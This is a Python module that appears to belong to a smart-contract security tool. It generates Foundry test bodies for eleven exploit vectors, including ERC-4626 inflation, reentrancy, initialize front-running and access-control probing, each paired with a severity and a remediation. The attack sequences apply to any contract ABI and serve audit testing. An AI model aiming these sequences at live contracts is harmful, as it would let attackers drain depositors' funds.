"""Exploit vector catalogue.

Each vector declares when it applies and emits a Solidity test body. Bodies are
generated with literal args + abi.encodeWithSignature so they work against any
ABI without hand-written bindings.
"""
from __future__ import annotations

from collections import defaultdict

STATIC = {"uint256", "address", "bool", "int256", "bytes32"}


def _default(t: str) -> str:
    if t.startswith("uint") or t.startswith("int"):
        return "uint256(1)" if t.startswith("uint") else "int256(1)"
    if t == "address":
        return "attacker"
    if t == "bool":
        return "true"
    if t == "bytes32":
        return "bytes32(0)"
    if t == "string":
        return '"bh"'
    if t.startswith("bytes"):
        return 'hex""'
    return None


class Sig:
    """Canonical-signature lookup over an ABI, skipping tuple/array noise."""

    def __init__(self, abi):
        self.by_name = defaultdict(list)
        for e in abi or []:
            if e.get("type") != "function":
                continue
            ins = e.get("inputs") or []
            if any(i.get("type", "").endswith(("[]", ")")) for i in ins):
                continue
            if len(ins) > 3:
                continue
            if any(_default(i["type"]) is None for i in ins):
                continue
            self.by_name[e["name"]].append(
                (f"{e['name']}({','.join(i['type'] for i in ins)})", [i["type"] for i in ins]))

    def find(self, *names, arity=None):
        for n in names:
            for sig, types in self.by_name.get(n, []):
                if arity is None or len(types) == arity:
                    return sig, types
        return None, None

    def has(self, *names) -> bool:
        return any(self.by_name.get(n) for n in names)

    def encode(self, sig: str, types: list) -> str:
        args = ", ".join(_default(t) for t in types)
        return f'abi.encodeWithSignature("{sig}"{", " + args if args else ""})'


def _body_4626(s: Sig, ctx) -> str | None:
    dep, dtypes = s.find("deposit", arity=2)
    red, _ = s.find("redeem", "withdraw", arity=3)
    if not (dep and red):
        return None
    return f"""
        address asset = IERC4626Min(target).asset();
        _track(asset);
        _startSnap();
        deal(asset, attacker, 2);
        vm.startPrank(attacker);
        target.call(abi.encodeWithSignature("deposit(uint256,address)", 1, attacker));
        IERC20Min(asset).transfer(target, uint256(1_000e18));
        vm.stopPrank();

        address victim = makeAddr("bh_victim");
        deal(asset, victim, uint256(1_000e18));
        vm.startPrank(victim);
        target.call(abi.encodeWithSignature("deposit(uint256,address)", uint256(1_000e18), victim));
        uint256 victimShares = IERC20Min(target).balanceOf(victim);
        vm.stopPrank();

        vm.startPrank(attacker);
        uint256 atkShares = IERC20Min(target).balanceOf(attacker);
        target.call(abi.encodeWithSignature("{red}", atkShares, attacker, attacker));
        vm.stopPrank();
        _note = string(abi.encodePacked("victim received ", vm.toString(victimShares),
            " shares for 1000e18 asset; attacker redeemed ", vm.toString(atkShares), " shares"));
    """


def _body_first_depositor(s: Sig, ctx) -> str | None:
    dep, _ = s.find("deposit", arity=2)
    if not dep:
        return None
    return """
        address asset = IERC4626Min(target).asset();
        _track(asset);
        _startSnap();
        deal(asset, attacker, 2);
        vm.startPrank(attacker);
        target.call(abi.encodeWithSignature("deposit(uint256,address)", 1, attacker));
        vm.stopPrank();
        address victim = makeAddr("bh_victim");
        deal(asset, victim, uint256(1e18));
        vm.startPrank(victim);
        target.call(abi.encodeWithSignature("deposit(uint256,address)", uint256(1e18), victim));
        vm.stopPrank();
        _structural = IERC20Min(target).balanceOf(victim) == 0;
        _note = string(abi.encodePacked("second depositor shares: ",
            vm.toString(IERC20Min(target).balanceOf(victim))));
    """


def _body_donation_k(s: Sig, ctx) -> str | None:
    if not (s.has("getReserves") and s.has("swap")):
        return None
    return """
        address t0 = IPairMin(target).token0();
        address t1 = IPairMin(target).token1();
        _track(t0); _track(t1);
        _startSnap();
        deal(t0, attacker, uint256(5e18));
        deal(t1, attacker, uint256(5e18));
        IERC20Min(t0).transfer(target, uint256(1e18));
        IERC20Min(t1).transfer(target, uint256(1e18));
        vm.startPrank(attacker);
        IERC20Min(t0).transfer(target, 1000);
        target.call(abi.encodeWithSignature("swap(uint256,uint256,address,bytes)",
            0, 500, attacker, hex""));
        vm.stopPrank();
        _note = "donated to reserves then swapped against inflated k";
    """


def _body_rounding(s: Sig, ctx) -> str | None:
    dep, _ = s.find("deposit", arity=2)
    wd, _ = s.find("withdraw", "redeem", arity=3)
    if not (dep and wd):
        return None
    return """
        address asset = IERC4626Min(target).asset();
        _track(asset);
        _startSnap();
        deal(asset, attacker, uint256(1000e18));
        vm.startPrank(attacker);
        IERC20Min(asset).approve(target, type(uint256).max);
        for (uint256 i; i < 25; i++) {
            target.call(abi.encodeWithSignature("deposit(uint256,address)", 3, attacker));
            uint256 sh = IERC20Min(target).balanceOf(attacker);
            if (sh > 0) target.call(abi.encodeWithSignature("withdraw(uint256,address,address)",
                sh, attacker, attacker));
        }
        vm.stopPrank();
        _note = "25 deposit/withdraw cycles of 3 wei";
    """


def _body_access(s: Sig, ctx) -> str | None:
    lines, n = [], 0
    for name, entries in s.by_name.items():
        if not any(k in name.lower() for k in (
                "owner", "admin", "fee", "oracle", "treasury", "upgrade", "pause",
                "mint", "burn", "sweep", "rescue", "withdraw", "set", "init")):
            continue
        for sig, types in entries:
            n += 1
            if n > 14:
                break
            lines.append(
                f'        (bool ok{n}, ) = target.call({s.encode(sig, types)});\n'
                f'        _note = string(abi.encodePacked(_note, ok{n} ? "1" : "0"));')
    if not lines:
        return None
    return ("        _startSnap();\n        vm.startPrank(attacker);\n"
            + "\n".join(lines) + "\n        vm.stopPrank();\n"
            '        _note = string(abi.encodePacked("call bitmap: ", _note));\n'
            "        _structural = true;\n")


def _body_initialize(s: Sig, ctx) -> str | None:
    init, types = s.find("initialize", "init")
    if not init:
        return None
    return f"""
        _startSnap();
        vm.startPrank(attacker);
        (bool ok, bytes memory ret) = target.call({s.encode(init, types)});
        vm.stopPrank();
        _note = string(abi.encodePacked("initialize(", vm.toString(ok), ") ret=",
            vm.toString(ret.length)));
        _structural = ok;
    """


def _body_reentrancy(s: Sig, ctx) -> str | None:
    fn, types = s.find("deposit", "stake", "supply", "mint", "join", arity=1)
    if not fn or types[0] != "uint256":
        return None
    return f"""
        _startSnap();
        Reenterer r = new Reenterer(target, {s.encode(fn, types)}, attacker);
        deal(address(r), uint256(10e18));
        vm.prank(attacker);
        (bool ok, ) = address(r).call{{value: 1 ether}}(
            abi.encodeWithSignature("fire(uint256)", 1));
        _note = string(abi.encodePacked("reentry ok=", vm.toString(ok),
            " depth=", vm.toString(r.depth())));
        _structural = r.depth() > 1;
    """


def _body_force_feed(s: Sig, ctx) -> str | None:
    if not s.has("totalAssets", "totalSupply", "getReserves"):
        return None
    return """
        _startSnap();
        uint256 before = target.balance;
        vm.deal(attacker, uint256(50e18));
        vm.prank(attacker);
        (bool ok, ) = target.call{value: 50 ether}("");
        _structural = !ok;
        _note = string(abi.encodePacked("force-send 50 ether accepted=",
            vm.toString(ok), " balance ", vm.toString(before)));
    """


def _body_replay(s: Sig, ctx) -> str | None:
    if not s.has("permit"):
        return None
    return """
        _startSnap();
        _structural = true;
        _note = "permit present - replay/chainid cross-replay needs a signed fixture";
    """


def _body_storage_collision(s: Sig, ctx) -> str | None:
    if not s.has("implementation", "proxiableUUID"):
        return None
    return """
        _startSnap();
        bytes32 raw = vm.load(target, bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
        address impl = address(uint160(uint256(raw)));
        _structural = impl == address(0);
        _note = string(abi.encodePacked("EIP-1967 impl slot: ", vm.toString(impl)));
    """


def _body_oracle_push(s: Sig, ctx) -> str | None:
    if not s.has("getPrice", "price", "latestAnswer", "consult"):
        return None
    return """
        _startSnap();
        _track(target);
        _structural = true;
        _note = "oracle consumer detected - pool push requires a resolved pair (see trace)";
    """


VECTORS = {
    "erc4626_inflation": {"applies": _body_4626, "sev": "critical",
        "remediation": "Seed the vault, or use virtual shares/offset (ERC-4626 inflation defence)."},
    "first_depositor": {"applies": _body_first_depositor, "sev": "high",
        "remediation": "Require minimum first deposit or dead-share mint."},
    "donation_k": {"applies": _body_donation_k, "sev": "medium",
        "remediation": "Use cumulative price, not spot reserves."},
    "rounding_drift": {"applies": _body_rounding, "sev": "medium",
        "remediation": "Round shares down on deposit, assets down on withdraw."},
    "access_control": {"applies": _body_access, "sev": "high",
        "remediation": "Gate every privileged setter; verify modifier coverage."},
    "initialize_frontrun": {"applies": _body_initialize, "sev": "critical",
        "remediation": "Call initialize in the deploy script or use a constructor."},
    "reentrancy": {"applies": _body_reentrancy, "sev": "critical",
        "remediation": "CEI ordering plus a nonReentrant guard on all value paths."},
    "force_feed": {"applies": _body_force_feed, "sev": "medium",
        "remediation": "Never rely on address(this).balance for accounting."},
    "signature_replay": {"applies": _body_replay, "sev": "high",
        "remediation": "Include chainid + nonce in the digest; consume nonces."},
    "storage_collision": {"applies": _body_storage_collision, "sev": "critical",
        "remediation": "Use EIP-1967 slots, not sequential storage."},
    "oracle_spot": {"applies": _body_oracle_push, "sev": "critical",
        "remediation": "TWAP with a sane window; check staleness."},
}